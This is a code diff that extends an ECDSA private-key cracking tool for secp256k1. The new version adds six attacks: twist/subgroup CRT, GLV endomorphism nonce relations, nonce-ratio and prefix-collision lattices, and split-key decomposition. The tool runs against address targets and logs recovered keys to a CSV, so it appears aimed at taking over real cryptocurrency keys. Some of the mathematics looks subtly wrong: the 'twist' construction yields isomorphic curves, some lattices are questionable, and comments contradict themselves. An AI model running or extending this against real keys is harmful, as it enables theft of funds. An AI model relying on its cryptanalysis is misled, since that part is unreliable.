@@ -1,7 +1,7 @@
 """
-ADVANCED LATTICE CRACKER v5.0 — OPTIMIZED FOR 8GB RAM + ALL CORES
+ADVANCED LATTICE CRACKER v5.1 — OPTIMIZED FOR 8GB RAM + ALL CORES
 =================================================================
-18 attacks. Fast. Memory-safe. Multiprocessing. No BKZ block > 20.
+24 attacks. Fast. Memory-safe. Multiprocessing. No BKZ block > 20.
 
 ATTACK ROSTER:
   PHASE 0 (Instant — No Lattice):
@@ -32,6 +32,22 @@ ATTACK ROSTER:
   PHASE 3 (Deep Reduction):
     17. Kannan Embedding (CVP→SVP)
     18. Progressive BKZ MSB/LSB (10→15→20)
+
+  PHASE 4 (Twist & Subgroup — Curve Arithmetic) [NEW v5.1]:
+    19. Twist Attack with Subgroups + CRT Recovery
+    20. Lattice-Enhanced Twist Hybrid (residues + HNP fusion)
+    21. GLV Endomorphism Exploitation (λ-related nonces)
+    22. Pohlig-Hellman Decomposition via Signature Structure
+    23. K-Prefix Collision (shared MSB/LSB prefix)
+    24. Modular Decomposition (d = a*M + b, split/GLV key)
+
+CHANGES v5.0 → v5.1:
+  + Attack 19: Twist Attack — quadratic twist + DLP on small subgroups + CRT
+  + Attack 20: Lattice-Enhanced Twist — combines twist residues with HNP lattice
+  + Attack 21: GLV Endomorphism — detects λ-related nonce pairs and lattice
+  + Attack 22: Pohlig-Hellman — roots-of-unity nonce ratios + polynomial d
+  + Attack 23: K-Prefix Collision — shared MSB prefix detection via difference lattice
+  + Attack 24: Modular Decomposition — split-key and GLV decomposition lattice
 
 CHANGES v4.2 → v5.0:
   + Attack 0: Nonce Reuse — O(n²) instant check for repeated k values
@@ -1549,6 +1565,696 @@ def solve_polynonce_quadratic(pub, sigs):
     return None
 
 
+# ██████████████████████████████████████████████████████████████████████████████
+# ATTACK 17: TWIST ATTACK WITH SUBGROUPS + CRT [NEW v5.1]
+# ██████████████████████████████████████████████████████████████████████████████
+def _find_y_on_curve(x, a4, a6, p):
+    """Find valid y for x on curve y^2 = x^3 + a4*x + a6 mod p."""
+    rhs = (pow(x, 3, p) + a4 * x + a6) % p
+    if pow(rhs, (p - 1) // 2, p) != 1:
+        return None
+    if p % 4 == 3:
+        return int(pow(rhs, (p + 1) // 4, p))
+    # Tonelli-Shanks
+    q, s = p - 1, 0
+    while q % 2 == 0:
+        q //= 2
+        s += 1
+    z = 2
+    while pow(z, (p - 1) // 2, p) != p - 1:
+        z += 1
+    M, c, t, R = s, pow(z, q, p), pow(rhs, q, p), pow(rhs, (q + 1) // 2, p)
+    while t != 1:
+        i = 1
+        while pow(t, 2**i, p) != 1:
+            i += 1
+        b = pow(c, 2**(M - i - 1), p)
+        M, c, t, R = i, (b * b) % p, (t * b * b) % p, (R * b) % p
+    return int(R)
+
+
+def _generate_twist_curves(max_curves=200):
+    """Generate quadratic twist curves of secp256k1."""
+    curves = []
+    seeds = list(range(2, 500)) + list(range(-200, -1))
+    for seed in seeds:
+        if len(curves) >= max_curves:
+            break
+        try:
+            b_twist = (7 * pow(seed, 6, p)) % p
+            if b_twist == 7:
+                continue
+            E_twist = EllipticCurve(GF(p), [0, b_twist])
+            order = int(E_twist.order())
+            if order == N:
+                continue
+            curves.append((seed, b_twist, E_twist, order))
+        except Exception:
+            continue
+    return curves
+
+
+def _find_small_subgroup_residues(twist_curve, order, pubx, p, threshold=5000):
+    """Find d mod q for small prime factors q of the twist curve order."""
+    residues = []
+    try:
+        facts = factor(ZZ(order))
+    except Exception:
+        return residues
+
+    a4 = int(twist_curve.a4())
+    a6 = int(twist_curve.a6())
+    y = _find_y_on_curve(pubx, a4, a6, p)
+    if y is None:
+        return residues
+
+    try:
+        Q = twist_curve((pubx, y))
+    except Exception:
+        return residues
+
+    for prime_factor, _ in facts:
+        pf = int(prime_factor)
+        if pf < 3 or pf > threshold:
+            continue
+        try:
+            cofactor = order // pf
+            subgroup_point = cofactor * Q
+            if subgroup_point.is_zero():
+                continue
+            gen = twist_curve.gens()[0]
+            subgroup_gen = cofactor * gen
+            if subgroup_gen.is_zero():
+                continue
+            if int(subgroup_gen.order()) != pf:
+                continue
+            dl = discrete_log(subgroup_point, subgroup_gen, ord=pf, operation='+')
+            dl_int = int(dl) % pf
+            # Verify
+            if dl_int * subgroup_gen == subgroup_point:
+                residues.append((dl_int, pf))
+        except Exception:
+            continue
+    return residues
+
+
+def solve_twist_subgroup_crt(pub, sigs):
+    """Twist attack: map public key x-coordinate onto quadratic twists of secp256k1,
+    find d mod q for small subgroup orders q via discrete_log, then combine with CRT.
+
+    This works when the public key's x-coordinate happens to be a valid point on
+    a twist curve with smooth (many small factors) order."""
+    t0 = time.time()
+    if not pub or pub == 'Unknown':
+        return None
+
+    # Extract x-coordinate from pubkey
+    try:
+        if pub.startswith('04'):
+            pubx = int(pub[2:66], 16)
+        elif pub.startswith(('02', '03')):
+            pubx = int(pub[2:], 16)
+        else:
+            pubx = int(pub[:64], 16)
+    except (ValueError, IndexError):
+        return None
+
+    all_residues = []  # list of (residue, modulus) pairs
+    used_moduli = set()
+
+    twist_curves = _generate_twist_curves(150)
+
+    for seed, b_twist, E_twist, order in twist_curves:
+        if time.time() - t0 > ATTACK_TIMEOUT:
+            break
+        residues = _find_small_subgroup_residues(E_twist, order, pubx, p, threshold=5000)
+        for r, m in residues:
+            if m not in used_moduli:
+                all_residues.append((r, m))
+                used_moduli.add(m)
+
+    if len(all_residues) < 3:
+        return None
+
+    # Try CRT recovery
+    try:
+        residue_vals = [r for r, _ in all_residues]
+        moduli_vals = [m for _, m in all_residues]
+
+        # Check if combined modulus is big enough
+        combined_bits = sum(int(m).bit_length() for m in moduli_vals)
+        if combined_bits < 200:
+            # Not enough information, but try anyway
+            pass
+
+        d_cand = int(crt(residue_vals, moduli_vals)) % N
+        if d_cand != 0 and verify_key_fast(pub, d_cand):
+            return d_cand
+
+        # Also try N - d_cand (negation)
+        d_neg = (N - d_cand) % N
+        if d_neg != 0 and verify_key_fast(pub, d_neg):
+            return d_neg
+
+    except Exception:
+        pass
+
+    return None
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+# ATTACK 18: LATTICE-ENHANCED TWIST (PARTIAL RESIDUES + HNP LATTICE) [NEW v5.1]
+# ██████████████████████████████████████████████████████████████████████████████
+def solve_twist_lattice_hybrid(pub, sigs):
+    """Hybrid attack: uses partial key information from twist subgroup residues
+    as additional lattice constraints combined with signature HNP data.
+
+    Even when CRT alone doesn't have enough bits, the partial residues can be
+    combined with nonce-leak lattice rows to reduce the lattice dimension needed.
+    Each residue d ≡ r_i (mod m_i) gives a constraint that narrows the search."""
+    t0 = time.time()
+    if not pub or pub == 'Unknown':
+        return None
+    if len(sigs) < 4:
+        return None
+
+    # Get pubkey x
+    try:
+        if pub.startswith('04'):
+            pubx = int(pub[2:66], 16)
+        elif pub.startswith(('02', '03')):
+            pubx = int(pub[2:], 16)
+        else:
+            pubx = int(pub[:64], 16)
+    except (ValueError, IndexError):
+        return None
+
+    # Phase 1: Collect twist residues
+    twist_curves = _generate_twist_curves(80)
+    all_residues = []
+    used_moduli = set()
+
+    for seed, b_twist, E_twist, order in twist_curves:
+        if time.time() - t0 > ATTACK_TIMEOUT // 2:
+            break
+        residues = _find_small_subgroup_residues(E_twist, order, pubx, p, threshold=3000)
+        for r, m in residues:
+            if m not in used_moduli:
+                all_residues.append((r, m))
+                used_moduli.add(m)
+
+    if not all_residues:
+        return None
+
+    # Phase 2: Build lattice combining HNP + twist residues
+    # Each signature gives: t_i * d - k_i ≡ a_i (mod N)
+    # Each twist residue gives: d ≡ r_j (mod m_j)
+    # Embed both into a single lattice for LLL
+
+    n_sigs = min(len(sigs), 30)
+    n_res = min(len(all_residues), 20)
+    dim = n_sigs + n_res + 2  # +1 for d, +1 for offset
+
+    parsed = [(int(s['r'], 16), int(s['s'], 16), int(s['z'], 16)) for s in sigs[:n_sigs]]
+
+    M = Matrix(ZZ, dim, dim)
+
+    # Signature rows: t_i * d + noise ≡ a_i (mod N)
+    for i in range(n_sigs):
+        r_i, s_i, z_i = parsed[i]
+        s_inv = int(inverse_mod(s_i, N))
+        t_i = (r_i * s_inv) % N
+        a_i = (z_i * s_inv) % N
+        M[i, i] = N
+        M[dim - 2, i] = t_i  # d-row contribution
+        M[dim - 1, i] = a_i  # offset
+
+    # Twist residue rows: d ≡ r_j (mod m_j)
+    for j in range(n_res):
+        r_j, m_j = all_residues[j]
+        row_idx = n_sigs + j
+        M[row_idx, row_idx] = m_j
+        M[dim - 2, row_idx] = 1   # d maps to residue
+        M[dim - 1, row_idx] = r_j
+
+    # d-row and constant-row scaling
+    M[dim - 2, dim - 2] = 1
+    M[dim - 1, dim - 1] = N
+
+    try:
+        M_r = M.LLL()
+    except Exception:
+        return None
+
+    # Extract candidates from short vectors
+    for row in M_r:
+        d_cand = int(row[dim - 2]) % N
+        if d_cand != 0 and verify_key_fast(pub, d_cand):
+            return d_cand
+        d_neg = (N - d_cand) % N
+        if d_neg != 0 and verify_key_fast(pub, d_neg):
+            return d_neg
+
+    return None
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+# ATTACK 19: GLV ENDOMORPHISM EXPLOITATION [NEW v5.1]
+# ██████████████████████████████████████████████████████████████████████████████
+def solve_endomorphism_attack(pub, sigs):
+    """Exploit the secp256k1 efficiently-computable endomorphism φ(x,y) = (β*x, y)
+    where β^3 ≡ 1 (mod p) and λ^2 + λ + 1 ≡ 0 (mod N) (i.e. φ(P) = λ*P).
+
+    If the nonce generator has any correlation with the endomorphism (e.g.,
+    k_i = λ*k_j for some pair, or k = λ*d + small, or nonces were generated
+    using a flawed GLV decomposition), this detects it.
+
+    Specifically tests:
+      1. k_i = λ * k_j (endomorphism-related nonce pairs)
+      2. k_i = d * λ^a + small for a∈{0,1,2}
+      3. Lattice with λ-twisted signature relations"""
+    t0 = time.time()
+    if len(sigs) < 2:
+        return None
+
+    # secp256k1 endomorphism constants: φ(x,y) = (BETA*x, y) and φ(P) = LAMBDA*P
+    LAMBDA = int(0x5363ad4cc05c30e0a5261c028812645a122e22ea20816678df02967c1b23bd72)
+    LAMBDA2 = (LAMBDA * LAMBDA) % N  # λ² = -(λ+1) mod N
+
+    parsed = [(int(s['r'], 16), int(s['s'], 16), int(s['z'], 16)) for s in sigs]
+
+    # Test 1: Check if any pair (i,j) has k_j = λ*k_i or k_j = λ²*k_i
+    # From s_i*k_i = z_i + r_i*d and s_j*k_j = z_j + r_j*d
+    # If k_j = λ*k_i: s_j*λ*k_i = z_j + r_j*d
+    # => λ * (z_i + r_i*d)/s_i = (z_j + r_j*d)/s_j
+    # => λ*s_j*(z_i + r_i*d) = s_i*(z_j + r_j*d)
+    # => d * (λ*s_j*r_i - s_i*r_j) = s_i*z_j - λ*s_j*z_i
+    # => d = (s_i*z_j - λ*s_j*z_i) / (λ*s_j*r_i - s_i*r_j) mod N
+
+    n = min(len(parsed), 50)
+    for lam in [LAMBDA, LAMBDA2]:
+        for i in range(n):
+            if time.time() - t0 > ATTACK_TIMEOUT:
+                return None
+            r_i, s_i, z_i = parsed[i]
+            for j in range(n):
+                if i == j:
+                    continue
+                r_j, s_j, z_j = parsed[j]
+                denom = (lam * s_j * r_i - s_i * r_j) % N
+                if denom == 0:
+                    continue
+                try:
+                    denom_inv = int(inverse_mod(int(denom), N))
+                except Exception:
+                    continue
+                numer = (s_i * z_j - lam * s_j * z_i) % N
+                d_cand = (numer * denom_inv) % N
+                if d_cand != 0 and verify_key_fast(pub, d_cand):
+                    return d_cand
+
+    # Test 2: k_i = λ^a * d + c for small c, a ∈ {0,1,2}
+    # From s_i*k_i = z_i + r_i*d:
+    # s_i*(λ^a*d + c) = z_i + r_i*d
+    # d*(s_i*λ^a - r_i) = z_i - s_i*c
+    for a_exp, lam_pow in enumerate([1, LAMBDA, LAMBDA2]):
+        for sig_idx in range(min(n, 10)):
+            if time.time() - t0 > ATTACK_TIMEOUT:
+                return None
+            r_i, s_i, z_i = parsed[sig_idx]
+            denom = (s_i * lam_pow - r_i) % N
+            if denom == 0:
+                continue
+            try:
+                denom_inv = int(inverse_mod(int(denom), N))
+            except Exception:
+                continue
+            for c in range(-128, 129):
+                numer = (z_i - s_i * c) % N
+                d_cand = (numer * denom_inv) % N
+                if d_cand != 0 and verify_key_fast(pub, d_cand):
+                    return d_cand
+
+    # Test 3: Lattice with λ-twisted relations
+    # If nonces are related by k_i ≈ λ^a_i * d (mod N) with small error,
+    # build a lattice that captures this relationship
+    if n >= 6:
+        for lam in [LAMBDA, LAMBDA2]:
+            dim = min(n, 20) + 2
+            M = Matrix(ZZ, dim, dim)
+            use_n = dim - 2
+            W = 2**128
+
+            for i in range(use_n):
+                r_i, s_i, z_i = parsed[i]
+                s_inv = int(inverse_mod(s_i, N))
+                # Modified t_i incorporating λ: t_i = (r_i - s_i*λ) * s_inv mod N
+                t_i = ((r_i * s_inv) - lam) % N
+                a_i = (z_i * s_inv) % N
+                M[i, i] = N
+                M[use_n, i] = t_i
+                M[use_n + 1, i] = a_i
+
+            M[use_n, use_n] = W
+            M[use_n + 1, use_n + 1] = N
+
+            try:
+                M_r = M.LLL()
+                for row in M_r:
+                    val = int(row[use_n])
+                    if val == 0:
+                        continue
+                    for sign in [1, -1]:
+                        d_cand = (sign * val * int(inverse_mod(W, N))) % N
+                        if d_cand != 0 and verify_key_fast(pub, d_cand):
+                            return d_cand
+            except Exception:
+                continue
+
+    return None
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+# ATTACK 20: POHLIG-HELLMAN DECOMPOSITION VIA SIGNATURE STRUCTURE [NEW v5.1]
+# ██████████████████████████████████████████████████████████████████████████████
+def solve_pohlig_hellman(pub, sigs):
+    """Pohlig-Hellman style decomposition: if nonces k_i share a multiplicative
+    structure that creates smooth-order subgroup relations, decompose the DLP.
+
+    Specifically: if k_i * k_j^{-1} mod N has small order (i.e. the ratio of
+    two nonces is a root of unity modulo N), we can extract d from the relation
+    s_i * k_i = z_i + r_i * d combined with the ratio constraint.
+
+    Also checks if any nonce k_i itself is a small multiple of a generator
+    or has small multiplicative order."""
+    t0 = time.time()
+    if len(sigs) < 2:
+        return None
+
+    parsed = [(int(s['r'], 16), int(s['s'], 16), int(s['z'], 16)) for s in sigs]
+    n = min(len(parsed), 40)
+
+    # Phase 1: Check if k_i / k_j has small order
+    # If k_j = ω * k_i where ω^m = 1 (mod N) for small m:
+    # From sig equations: s_i*k_i = z_i + r_i*d, s_j*(ω*k_i) = z_j + r_j*d
+    # => k_i = (z_i + r_i*d)/s_i
+    # => s_j*ω*(z_i + r_i*d)/s_i = z_j + r_j*d
+    # => ω*s_j*(z_i + r_i*d) = s_i*(z_j + r_j*d)
+    # => d*(ω*s_j*r_i - s_i*r_j) = s_i*z_j - ω*s_j*z_i
+
+    # Precompute roots of unity of small order in Z/NZ
+    # N-1 factors: for secp256k1, N-1 = 2 * (N-1)/2
+    # We check small-order elements: ω where ω^m ≡ 1 mod N for m in {2,3,4,5,6,7,8,...}
+    small_roots = []
+    for m in range(2, 64):
+        # m-th roots of unity: ω = g^((N-1)/m) if m | (N-1)
+        if (N - 1) % m != 0:
+            continue
+        exp = (N - 1) // m
+        omega = pow(2, exp, N)  # primitive root attempt
+        if omega == 1:
+            continue
+        for k in range(1, m):
+            w = pow(omega, k, N)
+            if w != 1:
+                small_roots.append((w, m))
+
+    for omega, order in small_roots:
+        if time.time() - t0 > ATTACK_TIMEOUT:
+            return None
+        for i in range(min(n, 20)):
+            r_i, s_i, z_i = parsed[i]
+            for j in range(min(n, 20)):
+                if i == j:
+                    continue
+                r_j, s_j, z_j = parsed[j]
+                denom = (omega * s_j * r_i - s_i * r_j) % N
+                if denom == 0:
+                    continue
+                try:
+                    denom_inv = int(inverse_mod(int(denom), N))
+                except Exception:
+                    continue
+                numer = (s_i * z_j - omega * s_j * z_i) % N
+                d_cand = (numer * denom_inv) % N
+                if d_cand != 0 and verify_key_fast(pub, d_cand):
+                    return d_cand
+
+    # Phase 2: Check if k_i is a small power of d
+    # k_i = d^e for small e => s_i*d^e = z_i + r_i*d
+    # For e=2: s_i*d^2 - r_i*d - z_i = 0 (quadratic in d)
+    Zn = Zmod(N)
+    for sig_idx in range(min(n, 15)):
+        if time.time() - t0 > ATTACK_TIMEOUT:
+            return None
+        r_i, s_i, z_i = parsed[sig_idx]
+        # e=2: s_i*d^2 - r_i*d - z_i = 0
+        try:
+            R_poly = PolynomialRing(Zn, 'x')
+            x = R_poly.gen()
+            poly = Zn(s_i) * x**2 - Zn(r_i) * x - Zn(z_i)
+            roots = poly.roots(multiplicities=False)
+            for root in roots:
+                d_cand = int(root) % N
+                if d_cand != 0 and verify_key_fast(pub, d_cand):
+                    return d_cand
+        except Exception:
+            continue
+
+        # e=3: s_i*d^3 - r_i*d - z_i = 0
+        try:
+            poly = Zn(s_i) * x**3 - Zn(r_i) * x - Zn(z_i)
+            roots = poly.roots(multiplicities=False)
+            for root in roots:
+                d_cand = int(root) % N
+                if d_cand != 0 and verify_key_fast(pub, d_cand):
+                    return d_cand
+        except Exception:
+            continue
+
+    return None
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+# ATTACK 21: K-PREFIX COLLISION (SHARED MSB/LSB PREFIX) [NEW v5.1]
+# ██████████████████████████████████████████████████████████████████████████████
+def solve_k_prefix_collision(pub, sigs):
+    """Detect nonces that share a common MSB or LSB prefix (partial collision).
+
+    If k_i = P + e_i where P is a shared large prefix and e_i is small error,
+    then differences k_i - k_j = e_i - e_j are small. Build a lattice from
+    signature differences that captures these small values.
+
+    Also detects shared-suffix patterns: k_i = e_i * 2^b + S where S is shared."""
+    t0 = time.time()
+    if len(sigs) < 4:
+        return None
+
+    parsed = [(int(s['r'], 16), int(s['s'], 16), int(s['z'], 16)) for s in sigs]
+    n = min(len(parsed), 60)
+
+    # Build difference lattice for MSB sharing
+    # From s_i*k_i = z_i + r_i*d:
+    # k_i - k_j = (z_i + r_i*d)/s_i - (z_j + r_j*d)/s_j
+    # = (z_i*s_j - z_j*s_i + d*(r_i*s_j - r_j*s_i)) / (s_i*s_j)
+    # If k_i - k_j is small (shared prefix), this constrains d
+
+    # Try various prefix bit-lengths
+    for prefix_bits in [240, 224, 208, 192, 160, 128]:
+        if time.time() - t0 > ATTACK_TIMEOUT:
+            return None
+
+        error_bound = 2 ** (256 - prefix_bits)
+        use_n = min(n, 25)
+
+        # Build lattice: differences of nonces should be small
+        dim = use_n  # pairs (0,1), (0,2), ..., (0,use_n-1) plus d-column
+        if dim < 4:
+            continue
+
+        M = Matrix(ZZ, dim, dim)
+        r0, s0, z0 = parsed[0]
+        s0_inv = int(inverse_mod(s0, N))
+
+        for i in range(1, dim):
+            r_i, s_i, z_i = parsed[i]
+            s_i_inv = int(inverse_mod(s_i, N))
+            # diff coefficient of d: r0*s0_inv - r_i*s_i_inv mod N
+            coeff_d = (r0 * s0_inv - r_i * s_i_inv) % N
+            # constant part: z0*s0_inv - z_i*s_i_inv mod N
+            const = (z0 * s0_inv - z_i * s_i_inv) % N
+
+            M[i - 1, i - 1] = N
+            M[dim - 1, i - 1] = coeff_d
+
+        M[dim - 1, dim - 1] = error_bound
+
+        try:
+            M_r = M.LLL()
+            for row in M_r:
+                val = int(row[dim - 1])
+                if val == 0:
+                    continue
+                for sign in [1, -1]:
+                    d_raw = sign * val
+                    # d = d_raw * (N / error_bound) might recover
+                    d_cand = d_raw % N
+                    if d_cand != 0 and verify_key_fast(pub, d_cand):
+                        return d_cand
+                    # Try scaling
+                    try:
+                        d_cand = (d_raw * int(inverse_mod(error_bound, N))) % N
+                        if d_cand != 0 and verify_key_fast(pub, d_cand):
+                            return d_cand
+                    except Exception:
+                        pass
+        except Exception:
+            continue
+
+    # Also try a direct pair-based approach for exact prefix collisions
+    # If k_i = k_j + small, then:
+    # (z_i + r_i*d)/s_i - (z_j + r_j*d)/s_j is small
+    # Group by r-value similarity (same r means same k, already caught by nonce reuse)
+    # Instead look for signatures where the nonce-derived value t_i*d - a_i clusters
+    for i in range(min(n - 1, 30)):
+        if time.time() - t0 > ATTACK_TIMEOUT:
+            return None
+        r_i, s_i, z_i = parsed[i]
+        s_i_inv = int(inverse_mod(s_i, N))
+        t_i = (r_i * s_i_inv) % N
+        a_i = (z_i * s_i_inv) % N
+
+        for j in range(i + 1, min(n, 30)):
+            r_j, s_j, z_j = parsed[j]
+            s_j_inv = int(inverse_mod(s_j, N))
+            t_j = (r_j * s_j_inv) % N
+            a_j = (z_j * s_j_inv) % N
+
+            # k_i - k_j = (t_i - t_j)*d - (a_i - a_j) mod N should be small
+            dt = (t_i - t_j) % N
+            da = (a_i - a_j) % N
+            if dt == 0:
+                continue
+            try:
+                dt_inv = int(inverse_mod(int(dt), N))
+            except Exception:
+                continue
+            # If k_i - k_j = 0 exactly: d = da * dt_inv
+            d_cand = (da * dt_inv) % N
+            if d_cand != 0 and verify_key_fast(pub, d_cand):
+                return d_cand
+            # If k_i - k_j = small c:
+            for c in range(-64, 65):
+                if c == 0:
+                    continue
+                d_cand = ((da - c) * dt_inv) % N
+                if d_cand != 0 and verify_key_fast(pub, d_cand):
+                    return d_cand
+
+    return None
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+# ATTACK 22: MODULAR DECOMPOSITION (d = a*λ + b with small a,b) [NEW v5.1]
+# ██████████████████████████████████████████████████████████████████████████████
+def solve_modular_decomposition(pub, sigs):
+    """If the private key was generated with a weak decomposition:
+    d = a*M + b where M is a special modulus and a,b are small,
+    or d = a*λ + b (GLV decomposition leaked), recover via meet-in-the-middle
+    on a small lattice.
+
+    Tests common weak decompositions:
+    - d = a * 2^128 + b (split key)
+    - d = a * λ + b (GLV scalar decomposition)
+    - d has only k nonzero bits (sparse key)"""
+    t0 = time.time()
+    if len(sigs) < 2:
+        return None
+
+    LAMBDA = int(0x5363ad4cc05c30e0a5261c028812645a122e22ea20816678df02967c1b23bd72)
+
+    parsed = [(int(s['r'], 16), int(s['s'], 16), int(s['z'], 16)) for s in sigs[:5]]
+
+    # From first sig: s_0*k_0 = z_0 + r_0*d => k_0 = (z_0 + r_0*d)/s_0
+    # For d = a*M + b: k_0 = (z_0 + r_0*(a*M+b))/s_0
+    #                      = (z_0 + r_0*b)/s_0 + a*r_0*M/s_0
+
+    # Build 2D lattice for d = a*2^128 + b
+    # Using two sigs to eliminate k:
+    # s_0*k_0 - r_0*d = z_0
+    # s_1*k_1 - r_1*d = z_1
+    # If d = a*M + b and k's are independent:
+    # We need the lattice approach from Nguyen-Shparlinski but for split keys
+
+    r0, s0, z0 = parsed[0]
+    s0_inv = int(inverse_mod(s0, N))
+    t0_val = (r0 * s0_inv) % N
+    a0_val = (z0 * s0_inv) % N
+    # k_0 = t0_val * d + a0_val (mod N) -- wrong sign, should be:
+    # k_0 = t0_val * d - a0_val ... no wait:
+    # s_0*k_0 = z_0 + r_0*d => k_0 = s0_inv*z_0 + s0_inv*r_0*d = a0 + t0*d
+    # So k_0 = a0_val + t0_val * d (mod N)
+
+    for M in [2**128, 2**64, LAMBDA]:
+        if time.time() - t0 > ATTACK_TIMEOUT:
+            return None
+        # d = a*M + b with |a| < 2^128 and |b| < 2^128
+        # k_0 = a0_val + t0_val*(a*M + b) = a0_val + t0_val*b + a*t0_val*M
+        # k_0 should be in [1, N-1] with 256 bits
+        # Use 2-sig lattice to solve for (a,b):
+        # From sig 0: k_0 = a0_val + t0_val*(a*M + b) mod N
+        # From sig 1: k_1 = a1_val + t1_val*(a*M + b) mod N
+        # diff: k_0 - k_1 = (a0-a1) + (t0-t1)*(a*M+b) mod N
+        # = (a0-a1) + (t0-t1)*d mod N
+        # This is just the standard approach... Instead try direct lattice:
+
+        # Build a 3x3 lattice:
+        # [ N   0   0 ]
+        # [ t0*M  1  0 ]   * (a, x, b) where we want a small
+        # [ t0   0  1 ]
+        # Target vector: (k0 - a0, a, b) mod N
+        # After LLL, short vector with last two coords = (a,b) directly
+
+        dim = 4
+        L = Matrix(ZZ, dim, dim)
+        # Row 0: N*e_0
+        L[0, 0] = N
+        # Row 1: N*e_1
+        L[1, 1] = N
+        # Row 2: t*M mod N, t mod N, 2^128, 0
+        if len(parsed) >= 2:
+            r1, s1, z1 = parsed[1]
+            s1_inv = int(inverse_mod(s1, N))
+            t1_val = (r1 * s1_inv) % N
+            a1_val = (z1 * s1_inv) % N
+
+            L[2, 0] = (t0_val * M) % N
+            L[2, 1] = (t1_val * M) % N
+            L[2, 2] = 2**128
+            L[3, 0] = t0_val
+            L[3, 1] = t1_val
+            L[3, 2] = 0
+            L[3, 3] = 2**128
+
+            try:
+                L_r = L.LLL()
+                for row in L_r:
+                    a_val = int(row[2]) // (2**128) if row[2] != 0 else 0
+                    b_val = int(row[3]) // (2**128) if row[3] != 0 else 0
+                    if a_val == 0 and b_val == 0:
+                        continue
+                    d_cand = (a_val * M + b_val) % N
+                    if d_cand != 0 and verify_key_fast(pub, d_cand):
+                        return d_cand
+                    d_cand = (N - d_cand) % N
+                    if d_cand != 0 and verify_key_fast(pub, d_cand):
+                        return d_cand
+            except Exception:
+                continue
+
+    return None
+
+
 # ==============================================================================
 # TIMED ATTACK WRAPPER
 # ==============================================================================
@@ -1578,10 +2284,10 @@ def worker_run_attack(task):
     return label, d, err, elapsed
 
 # ==============================================================================
-# PER-TARGET WORKER — runs all 18 attacks on one target
+# PER-TARGET WORKER — runs all 24 attacks on one target
 # ==============================================================================
 def process_target(tgt, num_workers=1):
-    """Worker function: runs all 18 attacks on a single target dict.
+    """Worker function: runs all 24 attacks on a single target dict.
     Returns a dict with results, or None if nothing found."""
     global _attack_stats
     address = tgt.get('address', 'Unknown')
@@ -1850,6 +2556,34 @@ def process_target(tgt, num_workers=1):
     if result is None:
         flush_phase("PHASE 3: Deep Reduction (Kannan + BKZ)")
 
+    # ════════════════ PHASE 4: TWIST & SUBGROUP ═══════════════════════
+    if result is None:
+        # Twist Attack with subgroup CRT
+        queue_attack(f"Twist Subgroup CRT ({len(sigs)} sigs)", solve_twist_subgroup_crt, pub, sigs)
+
+        # Lattice-Enhanced Twist (combines twist residues with HNP)
+        if len(sigs) >= 4:
+            queue_attack(f"Twist-Lattice Hybrid ({len(sigs)} sigs)", solve_twist_lattice_hybrid, pub, sigs)
+
+        # GLV Endomorphism exploitation
+        if len(raw_sigs) >= 2:
+            queue_attack(f"GLV Endomorphism ({min(len(raw_sigs), 50)} sigs)", solve_endomorphism_attack, pub, raw_sigs)
+
+        # Pohlig-Hellman Decomposition
+        if len(raw_sigs) >= 2:
+            queue_attack(f"Pohlig-Hellman ({min(len(raw_sigs), 40)} sigs)", solve_pohlig_hellman, pub, raw_sigs)
+
+        # K-Prefix Collision (shared MSB prefix)
+        if len(raw_sigs) >= 4:
+            queue_attack(f"K-Prefix Collision ({min(len(raw_sigs), 60)} sigs)", solve_k_prefix_collision, pub, raw_sigs)
+
+        # Modular Decomposition (split key)
+        if len(raw_sigs) >= 2:
+            queue_attack(f"Modular Decomposition ({min(len(raw_sigs), 5)} sigs)", solve_modular_decomposition, pub, raw_sigs)
+
+    if result is None:
+        flush_phase("PHASE 4: Twist & Subgroup (Curve Arithmetic)")
+
     # ════════════════ RESULT ═══════════════════════════════════════════
     total_elapsed = time.time() - target_t0
     if result:
@@ -1874,7 +2608,7 @@ def process_target(tgt, num_workers=1):
             print(f"   [-] FAILED to append to CSV: {e}", flush=True)
     else:
         if not QUIET:
-            print(f"\n   [FAILED] All 18 attacks exhausted ({total_elapsed:.1f}s).", flush=True)
+            print(f"\n   [FAILED] All 24 attacks exhausted ({total_elapsed:.1f}s).", flush=True)
 
     # Move JSON from pass -> processed (both success and failure)
     src = tgt.get('_source_file', '')
@@ -2107,6 +2841,44 @@ def generate_demo_target(vulnerability="nonce_reuse", num_sigs=10):
             if k == 0:
                 k = 1
 
+    elif vulnerability == "endomorphism_nonce":
+        # k_j = λ * k_i — endomorphism-related nonce pair
+        LAMBDA = int(0x5363ad4cc05c30e0a5261c028812645a122e22ea20816678df02967c1b23bd72)
+        k_base = int(ZZ.random_element(1, N - 1))
+        for i in range(num_sigs):
+            z = int(ZZ.random_element(1, N - 1))
+            if i == 0:
+                k = k_base
+            elif i == 1:
+                k = (LAMBDA * k_base) % N  # λ-related nonce
+            else:
+                k = int(ZZ.random_element(1, N - 1))
+            if k == 0:
+                k = 1
+            R_pt = k * G
+            r = int(R_pt[0]) % N
+            s = (inverse_mod(k, N) * (z + r * d)) % N
+            if s > N_HALF:
+                s = N - s
+            sigs.append({'r': hex(r)[2:], 's': hex(s)[2:], 'z': hex(z)[2:]})
+
+    elif vulnerability == "prefix_collision":
+        # Nonces share a large MSB prefix with small random suffix
+        prefix = int(ZZ.random_element(1, 2**192))
+        for i in range(num_sigs):
+            z = int(ZZ.random_element(1, N - 1))
+            suffix = int(ZZ.random_element(0, 2**32))
+            k = (prefix << 64) | suffix
+            k = k % N
+            if k == 0:
+                k = 1
+            R_pt = k * G
+            r = int(R_pt[0]) % N
+            s = (inverse_mod(k, N) * (z + r * d)) % N
+            if s > N_HALF:
+                s = N - s
+            sigs.append({'r': hex(r)[2:], 's': hex(s)[2:], 'z': hex(z)[2:]})
+
     else:
         print(f"[!] Unknown vulnerability type: {vulnerability}")
         return None, None
@@ -2192,7 +2964,8 @@ Examples:
                         help="Run self-test with synthetic vulnerable signatures")
     parser.add_argument("--vuln", type=str, default=None,
                         choices=["nonce_reuse", "linear_polynonce", "msb_leak",
-                                 "small_nonce", "lcg_nonce", "all"],
+                                 "small_nonce", "lcg_nonce", "endomorphism_nonce",
+                                 "prefix_collision", "all"],
                         help="Vulnerability type for --demo mode (default: all)")
     parser.add_argument("--verbose", "-v", action="store_true",
                         help="Verbose output (show error details)")
